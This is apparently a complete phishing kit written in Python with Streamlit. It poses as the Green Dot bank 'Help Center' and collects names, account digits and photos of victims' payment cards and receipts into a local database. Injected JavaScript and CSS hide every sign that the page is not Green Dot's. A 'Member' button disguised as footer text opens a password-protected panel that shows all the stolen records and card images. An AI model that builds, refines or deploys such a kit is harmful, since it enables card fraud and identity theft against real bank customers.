
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DATABASE ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL, 
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    chars = string.ascii_uppercase + string.digits
    return "GD-" + "".join(random.choice(chars) for _ in range(8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- JS: LIMPIEZA PROFUNDA ---
st.markdown("""<script>
    const cleanHard = () => {
        const targets = [
            '.section-anchor', 
            'a.section-anchor', 
            '[data-testid="stHeaderActionElements"]', 
            '[data-testid="stElementToolbar"]',
            '.stElementToolbar',
            'header', 
            'footer', 
            '.stDeployButton'
        ];
        targets.forEach(s => document.querySelectorAll(s).forEach(el => el.remove()));
    };
    setInterval(cleanHard, 300);
</script>""", unsafe_allow_html=True)

# --- CSS: STEALTH DESIGN ---
st.markdown("""<style>
    [data-testid='stHeader'], footer, header, .stDeployButton, .section-anchor, 
    [data-testid="stHeaderActionElements"], [data-testid="stElementToolbar"] {
        display: none !important; visibility: hidden !important;
    }
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .stButton>button {
        background-color: #00a05b !important; color: white !important;
        width: 100%; border: none !important; font-weight: bold !important; padding: 12px !important;
    }
    h1, h2, h3 { pointer-events: none !important; cursor: default !important; user-select: none !important; }
    .block-container { max-width: 550px !important; padding-top: 1.5rem !important; }

    .app-promo-container {
        background-color: #111111; padding: 35px 20px; text-align: center;
        border-radius: 12px; margin: 30px 0; border: 1px solid #222;
    }
    .legal-footer {
        font-size: 10px; color: #555; text-align: justify; margin-top: 40px;
        border-top: 1px solid #222; padding-top: 20px; line-height: 1.6;
        display: inline-block;
    }
    /* Mimetizamos el botón 'Member' para que sea indistinguible del texto */
    div[data-testid="stButton"] button:has(div:contains("Member")) {
        background: transparent !important;
        border: none !important;
        color: #555 !important;
        padding: 0 !important;
        margin: 0 !important;
        display: inline !important;
        vertical-align: baseline !important;
        font-size: 10px !important;
        font-family: inherit !important;
        cursor: default !important;
        min-height: 0 !important;
        line-height: 1.6 !important;
        width: auto !important;
    }
    div[data-testid="stButton"] button:has(div:contains("Member")):hover {
        color: #555 !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state:
    st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col1, col2, col3 = st.columns([1,2,1])
    with col2: 
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("dispute_form_v27", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.markdown("**Evidence**")
        rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
        submitted = st.form_submit_button("SUBMIT NOW")

    if submitted:
        if nombre and rec and car:
            ref_id = generate_ref()
            f_path = os.path.join(UPLOAD_DIR, f"f_{ref_id}_{rec.name}")
            t_path = os.path.join(UPLOAD_DIR, f"t_{ref_id}_{car.name}")
            with open(f_path, "wb") as f: f.write(rec.getbuffer())
            with open(t_path, "wb") as f: f.write(car.getbuffer())

            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT INTO greendot_submissions (nombre, cuenta, monto, factura_path, tarjeta_path, fecha, ref_id) VALUES (?,?,?,?,?,?,?)",
                      (nombre, cuenta, monto, f_path, t_path, str(datetime.now()), ref_id))
            conn.commit(); conn.close()

            st.markdown(f"<div style='background:#0e1a10; border:1px solid #00a05b; padding:20px; border-radius:10px; text-align:center;'>" +
                        f"<h2 style='color:#00a05b;'>✅ Claim Submitted</h2><p>Reference: <b>{ref_id}</b></p>" +
                        f"<p style='font-size:12px; color:#888;'>Our team will review your request in 2-5 days.</p></div>", unsafe_allow_html=True)
        else: st.error("Required fields missing.")

    st.markdown("""<div class='app-promo-container'>
        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='140'>
            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='140'>
        </div>
    </div>""", unsafe_allow_html=True)

    # Footer mimetizado con el trigger en 'Member'
    footer_col1, footer_col2, footer_col3 = st.columns([0.48, 0.08, 0.44])
    with footer_col1:
        st.markdown("<div class='legal-footer' style='border:none; margin-top:0; padding-top:0;'>Green Dot® cards are issued by Green Dot Bank,</div>", unsafe_allow_html=True)
    with footer_col2:
        if st.button("Member", key="admin_trigger"):
            st.session_state.admin_mode = True
    with footer_col3:
        st.markdown("<div class='legal-footer' style='border:none; margin-top:0; padding-top:0; border-top:none;'>FDIC. ©2026 Green Dot Corporation.</div>", unsafe_allow_html=True)

else:
    st.title("🔐 Internal Database")
    if st.button("Back"): st.session_state.admin_mode = False
    pw = st.text_input("Password", type="password")
    if pw == "Diostieneelpoder1":
        conn = sqlite3.connect(DB_NAME)
        df = pd.read_sql_query("SELECT * FROM greendot_submissions ORDER BY id DESC", conn)
        conn.close()
        st.write(f"Total Registros: {len(df)}")
        st.dataframe(df)
        for _, row in df.iterrows():
            with st.expander(f"Detalle: {row['nombre']} ({row['ref_id']})"):
                st.write(f"Fecha: {row['fecha']}")
                st.write(f"Monto: ${row['monto']}")
                colA, colB = st.columns(2)
                if os.path.exists(row['factura_path']): colA.image(row['factura_path'], caption="Factura")
                if os.path.exists(row['tarjeta_path']): colB.image(row['tarjeta_path'], caption="Tarjeta")
